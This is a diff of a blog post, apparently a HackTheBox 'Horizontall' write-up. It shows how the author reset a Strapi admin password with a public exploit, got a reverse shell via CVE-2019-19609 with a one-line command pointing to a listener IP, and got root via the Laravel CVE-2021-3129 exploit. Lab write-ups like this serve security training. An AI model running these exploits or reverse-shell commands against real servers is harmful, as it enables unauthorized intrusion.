@@ -64,7 +64,7 @@ Visiting /admin on the browser, I was presented with a login page running Strapi
 
 ![](/images/2022-01-26_15-42_1.png)
 
-I proceeded to searching Google for Strapi CMS and found that this CMS is vulnerable to a couple of remote code execution (RCE) vulnerabilities. One I found interesting is the unauthenticated exploit at https://www.exploit-db.com/exploit/50239. The exploit basically resets the admin password to a given value and provides a JWT token for the session. I downloaded and ran the exploit with the required parameter and was able to successfully reset the admin's password and obtain a JWT key and was able to login into the admin dashboard.
+I proceeded to searching Google for Strapi CMS and found that this CMS is vulnerable to a couple of remote code execution (RCE) vulnerabilities. One I found interesting is the unauthenticated exploit at <https://www.exploit-db.com/exploit/50239>. The exploit basically resets the admin password to a given value and provides a JWT token for the session. I downloaded and ran the exploit with the required parameter and was able to successfully reset the admin's password and obtain a JWT key and was able to login into the admin dashboard.
 
 ![](/images/2022-01-26_14-21.png)
 
@@ -74,7 +74,7 @@ I proceeded to searching Google for Strapi CMS and found that this CMS is vulner
 
 ![](/images/2022-01-26_15-42.png)
 
-At this point, there are two options. The first is to send commands through the cmd shell obtained from the exploit above and wait for possible execution (blind RCE). The second option (which I followed) was to use another RCE exploit (authenticated) to gain a shell on the box. I found an exploit at https://github.com/diego-tella/CVE-2019-19609-EXPLOIT. The exploit takes a domain name or IP address, a JWT token, a listening host IP and a listening port. I ran the exploit and was able to obtain a reverse shell on my machine.
+At this point, there are two options. The first is to send commands through the cmd shell obtained from the exploit above and wait for possible execution (blind RCE). The second option (which I followed) was to use another RCE exploit (authenticated) to gain a shell on the box. I found an exploit at <https://github.com/diego-tella/CVE-2019-19609-EXPLOIT>. The exploit takes a domain name or IP address, a JWT token, a listening host IP and a listening port. I ran the exploit and was able to obtain a reverse shell on my machine.
 
 `python exploit.py -d http://********.horizontall.htb -jwt JWT -l 10.10.14.104 -p 9001`
 
@@ -108,11 +108,11 @@ In order to access the service, I tunneled the port to my local machine on port 
 
 ![](/images/2022-01-26_15-03_1.png)
 
-Searching for Laravel8 vulnerabilities on Google, I came across an interesting documentation on bookhacktricks - https://book.hacktricks.xyz/pentesting/pentesting-web/laravel. To verify, I checked that the Laravel setup is in debug mode.
+Searching for Laravel8 vulnerabilities on Google, I came across an interesting documentation on bookhacktricks - <https://book.hacktricks.xyz/pentesting/pentesting-web/laravel>. To verify, I checked that the Laravel setup is in debug mode.
 
 ![](/images/2022-01-26_15-04.png)
 
-Down the page, there is link to a Laravel deserialization exploit. I used the exploit at https://github.com/nth347/CVE-2021-3129_exploit. Running the exploit with the required parameters, I was able to obtain a root shell on the box.
+Down the page, there is link to a Laravel deserialization exploit. I used the exploit at <https://github.com/nth347/CVE-2021-3129_exploit>. Running the exploit with the required parameters, I was able to obtain a root shell on the box.
 
 ![](/images/2022-01-26_15-06.png)
 
